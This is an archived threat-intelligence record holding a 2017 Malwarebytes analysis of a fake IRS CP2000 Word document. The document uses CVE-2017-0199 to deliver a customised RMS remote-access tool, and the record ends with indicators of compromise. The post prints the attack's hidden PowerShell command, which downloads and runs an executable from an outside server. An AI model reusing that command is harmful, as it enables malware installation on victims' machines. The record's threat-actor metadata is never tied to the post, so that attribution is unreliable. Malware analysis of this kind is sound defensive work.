{
    "id": "bdd1d844-6d5e-4949-bc78-42d563882fa7",
    "created_at": "2023-01-12T15:05:34.804615Z",
    "updated_at": "2025-03-27T02:05:41.736839Z",
    "deleted_at": null,
    "sha1_hash": "502b0e7b0a4f0a17a0a8891511e6baaf19d7008c",
    "title": "2017-09-21 - Fake IRS notice delivers customized spying tool",
    "authors": "",
    "file_creation_date": "2022-05-28T19:21:16Z",
    "file_modification_date": "2022-05-28T19:21:16Z",
    "file_size": 995501,
    "plain_text": "# Fake IRS notice delivers customized spying tool\n\n**[blog.malwarebytes.com/threat-analysis/2017/09/cve-2017-0199-used-to-deliver-modified-rms-agent-rat/](https://blog.malwarebytes.com/threat-analysis/2017/09/cve-2017-0199-used-to-deliver-modified-rms-agent-rat/)**\n\nJérôme Segura September 21, 2017\n\nWhile macro-based documents and scripts make up for the majority of malspam attacks\nthese days, we also see some campaigns that leverage documents embedded with exploits.\nCase in point, we came across a malicious Microsoft Office file disguised as a CP2000\nnotice. The Internal Revenue Service (IRS) usually mails out this letter to taxpayers\nwhen information is incorrectly reported on a previous return.\n\nVictims that fall for the scam will infect themselves with a custom Remote Administration\nTool. A RAT can be utilized for legitimate purposes, for example by a system administrator,\nbut it can also be used without a user’s consent or knowledge to remotely control their\nmachine, view and delete files or deploy a keylogger to silently capture keystrokes.\n\nIn this blog post, we will review this exploit’s delivery mechanism and take a look at the\nremote tool it deploys.\n\n## Distribution\n\nThe malicious document is hosted on a remote server and users are most likely enticed to\nopen it via a link from a phishing email. The file contains an OLE2 embedded link object\nwhich retrieves a malicious HTA script from a remote server and executes it. In turn, it\n\n\n-----\n\ndownloads the final payload, all with very little user interaction required since it is using CVE2017-0199, first [uncovered in April 2017 as a zero-day.](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html)\n```\n82.211.30[.]108/css/CP2000IRS.doc\n\n```\nThe embedded link points to an HTA script hosted under an unexpected location – a\nNorwegian company’s compromised FTP server – which invokes PowerShell to download\nand execute the actual malware payload.\n\n\n-----\n\n```\nftp://lindrupmartinsen[.]no:21/httpdocs/test/template.hta\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \n-WindowStyle Hidden (New-Object System.Net.WebClient)\n.DownloadFile('http://82.211.30[.]108/css/intelgfx.exe',\n'C:\\Users\\[username]\\AppData\\Roaming\\62962.exe');\n\n## Payload\n\n```\nThe downloaded payload (intelgfx.exe) extracts to several components into a local folder and\nachieves persistence using a decoy shortcut. The VBS scripts ensure that the main module\nruns without showing its GUI, in order to remain invisible to the victim.\n\n\n-----\n\n[RMS agent stands for Remote Manipulator System and is a remote control application made](https://ru.wikipedia.org/wiki/Remote_Manipulator_System)\nby a Russian company. It appears that in this case, the attackers took the original program\n(as pictured below) and slightly customized it, not to mention the fact that they are using it for\nnefarious purposes, namely spying on their victims.\n\n\n-----\n\nIts source code shows the debugging path information and name that they gave to the\nmodule.\n\n## Office exploits and RATs\n\nThis is not the first time that CVE-2017-0199 is used to distribute a RAT. Last August,\n[TrendMicro described an attack where the same exploit was adapted for PowerPoint and](http://blog.trendmicro.com/trendlabs-security-intelligence/cve-2017-0199-new-malware-abuses-powerpoint-slide-show/)\nused to deliver the REMCOS RAT. It also shows that threat actors often repackage existing\ntoolkits – which can be legitimate – and turn them into full-fledged spying applications.\n\nWe reported the compromised FTP server to its owner. [Malwarebytes users were already](https://www.malwarebytes.com/)\nprotected against CVE-2017-0199 as well as its payload which is detected as Backdoor.Bot.\n\n\n-----\n\n_Thanks to_ _[@hasherezade for help with payload analysis.](https://twitter.com/hasherezade)_\n\n## Indicators of compromise\n\n**Word doc CVE-2017-0199**\n```\n82.211.30[.]108/css/CP2000IRS.doc\n47ee31f74b6063fab028111e2be6b3c2ddab91d48a98523982e845f9356979c1\n\n```\n**HTA script**\n```\nftp://lindrupmartinsen[.]no:21/httpdocs/test/template.hta\nd01b6d9507429df065b9b823e763a043aa38b722419d35f29a587c893b3008a5\n\n```\n**Main package (intelgfx.exe)**\n```\n82.211.30[.]108/css/intelgfx.exe\n924aa03c953201f303e47ddc4825b86abb142edb6c5f82f53205b6c0c61d82c8\n\n```\n**RAT module**\n```\n4d0e5ebb4d64adc651608ff4ce335e86631b0d93392fe1e701007ae6187b7186\n\n```\n**Other IOCs from same distribution server**\n\n\n-----\n\n```\n82.211.30[.]108/estate.xml\n82.211.30[.]108/css/qbks.exe\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-09-21 - Fake IRS notice delivers customized spying tool.pdf"
    ],
    "report_names": [
        "2017-09-21 - Fake IRS notice delivers customized spying tool.pdf"
    ],
    "threat_actors": [
        {
            "id": "475ea823-9e47-4098-b235-0900bc1a5362",
            "created_at": "2022-10-25T16:07:24.506596Z",
            "updated_at": "2025-03-27T02:02:10.263346Z",
            "deleted_at": null,
            "main_name": "Lunar Spider",
            "aliases": [
                "Gold SwathMore"
            ],
            "source_name": "ETDA:Lunar Spider",
            "tools": [
                "BokBot",
                "IceID",
                "IcedID",
                "NeverQuest",
                "Vawtrak",
                "grabnew"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c2385aea-d30b-4dbc-844d-fef465cf3ea9",
            "created_at": "2023-01-06T13:46:38.916521Z",
            "updated_at": "2025-03-27T02:00:02.950071Z",
            "deleted_at": null,
            "main_name": "LUNAR SPIDER",
            "aliases": [
                "GOLD SWATHMORE"
            ],
            "source_name": "MISPGALAXY:LUNAR SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "63061658-5810-4f01-9620-7eada7e9ae2e",
            "created_at": "2022-10-25T15:50:23.752974Z",
            "updated_at": "2025-03-27T02:00:55.538582Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "Wizard Spider",
                "UNC1878",
                "TEMP.MixMaster",
                "Grim Spider",
                "FIN12",
                "GOLD BLACKBURN",
                "ITG23",
                "Periwinkle Tempest",
                "DEV-0193"
            ],
            "source_name": "MITRE:Wizard Spider",
            "tools": [
                "TrickBot",
                "AdFind",
                "BITSAdmin",
                "Bazar",
                "LaZagne",
                "Nltest",
                "GrimAgent",
                "Dyre",
                "Ryuk",
                "Conti",
                "Emotet",
                "Rubeus",
                "Mimikatz",
                "Diavol",
                "PsExec",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f6f91e1c-9202-4497-bf22-9cd5ef477600",
            "created_at": "2023-01-06T13:46:38.86765Z",
            "updated_at": "2025-03-27T02:00:02.938998Z",
            "deleted_at": null,
            "main_name": "WIZARD SPIDER",
            "aliases": [
                "FIN12",
                "UNC2053",
                "Pistachio Tempest",
                "TEMP.MixMaster",
                "GOLD BLACKBURN",
                "Periwinkle Tempest",
                "DEV-0193",
                "Storm-0193",
                "Trickbot LLC",
                "DEV-0237"
            ],
            "source_name": "MISPGALAXY:WIZARD SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e6a21528-2999-4e2e-aaf4-8b6af14e17f3",
            "created_at": "2022-10-25T16:07:24.422115Z",
            "updated_at": "2025-03-27T02:02:10.216817Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "DEV-0193",
                "Gold Blackburn",
                "Gold Ulrick",
                "Grim Spider",
                "ITG23",
                "Operation BazaFlix",
                "Periwinkle Tempest",
                "TEMP.MixMaster",
                "Wizard Spider"
            ],
            "source_name": "ETDA:Wizard Spider",
            "tools": [
                "AdFind",
                "Agentemis",
                "Anchor_DNS",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "Conti",
                "Diavol",
                "Dyranges",
                "Dyre",
                "Dyreza",
                "Dyzap",
                "Gophe",
                "Invoke-SMBAutoBrute",
                "KEGTAP",
                "LaZagne",
                "LightBot",
                "PowerSploit",
                "PowerTrick",
                "PsExec",
                "Ryuk",
                "SessionGopher",
                "TSPY_TRICKLOAD",
                "Team9Backdoor",
                "The Trick",
                "TheTrick",
                "Totbrick",
                "TrickBot",
                "TrickLoader",
                "TrickMo",
                "Upatre",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535934,
    "ts_updated_at": 1743041141,
    "ts_creation_date": 1653765676,
    "ts_modification_date": 1653765676,
    "files": {
        "pdf": "https://archive.orkl.eu/502b0e7b0a4f0a17a0a8891511e6baaf19d7008c.pdf",
        "text": "https://archive.orkl.eu/502b0e7b0a4f0a17a0a8891511e6baaf19d7008c.txt",
        "img": "https://archive.orkl.eu/502b0e7b0a4f0a17a0a8891511e6baaf19d7008c.jpg"
    }
}